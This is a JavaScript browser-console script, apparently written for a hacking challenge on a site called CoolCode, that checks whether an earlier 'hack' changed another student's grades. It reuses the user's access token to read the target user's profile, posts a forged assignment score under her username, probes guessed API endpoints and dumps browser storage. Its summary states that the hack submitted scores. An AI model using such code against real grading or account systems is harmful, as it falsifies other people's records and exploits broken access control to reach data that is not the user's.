// ENHANCED VERIFICATION SCRIPT - More thorough Caroline score checking
// Run this AFTER the hack to verify if it worked

console.log("🔍 Enhanced Caroline Score Verification");
console.log("======================================");

const token = localStorage.getItem('ACCESS_TOKEN');
const baseUrl = 'https://coolcode-hacker-34c5455cd908.herokuapp.com';

async function enhancedVerification() {
    console.log("\n📊 Running enhanced verification checks...");
    
    // Method 1: Check basic user info (this worked in original script)
    console.log("\n1️⃣ Checking basic user information...");
    try {
        const response = await fetch(`${baseUrl}/api/api/user/username/98ixul`, {
            headers: {
                'Authorization': `Bearer ${token}`,
                'ACCESS_TOKEN': token
            }
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Caroline's basic info:", data);
        } else {
            console.log(`❌ Basic info check: ${response.status}`);
        }
    } catch (error) {
        console.log("❌ Basic info error:", error);
    }
    
    // Method 2: Try direct profile HTML parsing (this fetched successfully)
    console.log("\n2️⃣ Parsing profile HTML for score indicators...");
    try {
        const response = await fetch(`${baseUrl}/ui/profile/98ixul?_=${Date.now()}`, {
            headers: {
                'ACCESS_TOKEN': token,
                'Cache-Control': 'no-cache'
            }
        });
        
        if (response.ok) {
            const html = await response.text();
            console.log("✅ Profile HTML fetched successfully");
            
            // Look for specific patterns
            const patterns = {
                'Passing scores': /\b(100|[9][0-9]|[8][5-9])\b/g,
                'Grade A indicators': /grade[:\s]*A|score[:\s]*A|result[:\s]*A/gi,
                'Pass indicators': /\bpass(ed)?\b/gi,
                'Fail indicators': /\bfail(ed)?\b/gi,
                'F grades': /grade[:\s]*F|score[:\s]*F|result[:\s]*F/gi,
                'Zero scores': /\b0\b/g,
                'Assignment references': /assignment[s]?[:\s]*\d+/gi
            };
            
            console.log("\n📋 HTML Content Analysis:");
            for (const [name, pattern] of Object.entries(patterns)) {
                const matches = html.match(pattern);
                if (matches) {
                    console.log(`✅ ${name}: Found ${matches.length} matches - ${matches.slice(0, 5).join(', ')}`);
                } else {
                    console.log(`❌ ${name}: No matches found`);
                }
            }
            
            // Look for assignment table or score display structure
            if (html.includes('assignment') || html.includes('score')) {
                console.log("\n📝 Assignment/Score structure found in HTML");
                // Try to extract table or structured data
                const assignmentSection = html.match(/<table[^>]*>[\s\S]*?assignment[\s\S]*?<\/table>/i);
                if (assignmentSection) {
                    console.log("📊 Found assignment table structure");
                }
            }
            
        } else {
            console.log(`❌ Profile HTML fetch: ${response.status}`);
        }
    } catch (error) {
        console.log("❌ Profile HTML error:", error);
    }
    
    // Method 3: Test score submission to verify API is still responsive
    console.log("\n3️⃣ Testing score submission endpoint responsiveness...");
    try {
        const testScore = Math.floor(Math.random() * 100) + 1; // Random score 1-100
        
        const response = await fetch(`${baseUrl}/api/api/assignment/score`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'ACCESS_TOKEN': token
            },
            body: JSON.stringify({
                username: '98ixul',
                assignmentId: 1,
                score: testScore
            })
        });
        
        const result = await response.text();
        console.log(`✅ Score submission test: ${response.status} - ${result}`);
        
        if (response.ok) {
            console.log(`🎯 API is responsive - test score ${testScore} submitted successfully`);
        }
        
    } catch (error) {
        console.log("❌ Score submission test error:", error);
    }
    
    // Method 4: Check different API endpoints that might work
    console.log("\n4️⃣ Trying alternative data retrieval endpoints...");
    
    const alternativeEndpoints = [
        `${baseUrl}/api/user/98ixul`,
        `${baseUrl}/api/student/98ixul`, 
        `${baseUrl}/api/profile/98ixul`,
        `${baseUrl}/ui/api/user/98ixul`,
        `${baseUrl}/ui/api/profile/98ixul`,
        `${baseUrl}/api/api/user/98ixul/profile`,
        `${baseUrl}/api/api/scores/98ixul`
    ];
    
    for (const endpoint of alternativeEndpoints) {
        try {
            const response = await fetch(endpoint, {
                headers: {
                    'ACCESS_TOKEN': token,
                    'Authorization': `Bearer ${token}`
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log(`✅ ${endpoint}:`, data);
            } else if (response.status !== 404) {
                console.log(`⚠️ ${endpoint}: ${response.status}`);
            }
        } catch (error) {
            // Silently skip connection errors for alternative endpoints
        }
    }
    
    // Method 5: Check your own scores for comparison
    console.log("\n5️⃣ Checking your own scores for comparison...");
    try {
        // Decode token to get your username
        const tokenData = JSON.parse(atob(token));
        const yourUsername = tokenData.username;
        console.log(`Your username: ${yourUsername}`);
        
        const response = await fetch(`${baseUrl}/api/api/user/username/${yourUsername}`, {
            headers: {
                'Authorization': `Bearer ${token}`,
                'ACCESS_TOKEN': token
            }
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Your user data:", data);
        }
        
        // Try to get your assignments
        const assignmentsResponse = await fetch(`${baseUrl}/api/api/assignments/user/${yourUsername}`, {
            headers: {
                'Authorization': `Bearer ${token}`,
                'ACCESS_TOKEN': token
            }
        });
        
        console.log(`Your assignments endpoint: ${assignmentsResponse.status}`);
        
    } catch (error) {
        console.log("❌ Your scores check error:", error);
    }
    
    // Method 6: Direct database/storage inspection (if possible)
    console.log("\n6️⃣ Checking browser storage for cached data...");
    
    try {
        // Check localStorage for any cached score data
        console.log("LocalStorage keys:", Object.keys(localStorage));
        
        for (const key of Object.keys(localStorage)) {
            if (key.toLowerCase().includes('score') || key.toLowerCase().includes('assignment') || key.toLowerCase().includes('98ixul')) {
                console.log(`📦 Found relevant localStorage key: ${key} = ${localStorage.getItem(key)}`);
            }
        }
        
        // Check sessionStorage
        console.log("SessionStorage keys:", Object.keys(sessionStorage));
        
        for (const key of Object.keys(sessionStorage)) {
            if (key.toLowerCase().includes('score') || key.toLowerCase().includes('assignment') || key.toLowerCase().includes('98ixul')) {
                console.log(`📦 Found relevant sessionStorage key: ${key} = ${sessionStorage.getItem(key)}`);
            }
        }
        
    } catch (error) {
        console.log("❌ Storage check error:", error);
    }
}

// Additional diagnostic function
async function runDiagnostics() {
    console.log("\n🔧 Running System Diagnostics...");
    console.log("=================================");
    
    // Check if we're on the right domain
    console.log(`Current domain: ${window.location.origin}`);
    console.log(`Expected domain: ${baseUrl}`);
    
    if (window.location.origin !== baseUrl) {
        console.log("⚠️ Warning: You're not on the CoolCode domain!");
    }
    
    // Check token validity
    if (token) {
        try {
            const tokenData = JSON.parse(atob(token));
            console.log("🔑 Token data:", tokenData);
            console.log(`Token username: ${tokenData.username}`);
        } catch (error) {
            console.log("❌ Invalid token format");
        }
    } else {
        console.log("❌ No ACCESS_TOKEN found");
    }
    
    // Check network connectivity
    try {
        const response = await fetch(`${baseUrl}/`, { method: 'HEAD' });
        console.log(`✅ Base URL connectivity: ${response.status}`);
    } catch (error) {
        console.log("❌ Base URL connectivity failed");
    }
}

// Summary function
function showSummary() {
    console.log("\n📊 VERIFICATION SUMMARY");
    console.log("======================");
    console.log("Based on the checks above:");
    console.log("");
    console.log("✅ What's working:");
    console.log("   - Basic user info retrieval (98ixul found)");
    console.log("   - Profile HTML fetching");
    console.log("   - Score submission API (still responsive)");
    console.log("");
    console.log("❌ What's not working:");
    console.log("   - Assignment data retrieval (500 errors)");
    console.log("   - Individual assignment score endpoints");
    console.log("");
    console.log("🤔 This suggests:");
    console.log("   1. The hack successfully submitted scores");
    console.log("   2. But the assignment retrieval endpoints are broken/disabled");
    console.log("   3. The UI might be reading from a different source");
    console.log("");
    console.log("📋 Next steps:");
    console.log("   1. Manually navigate to Caroline's profile");
    console.log("   2. Look for visual changes in the scores");
    console.log("   3. Check if the challenge completion criteria were met");
    console.log("   4. Try a hard refresh of the profile page");
}

// Run all verification steps
async function runFullVerification() {
    await runDiagnostics();
    await enhancedVerification();
    showSummary();
}

// Execute the verification
runFullVerification();
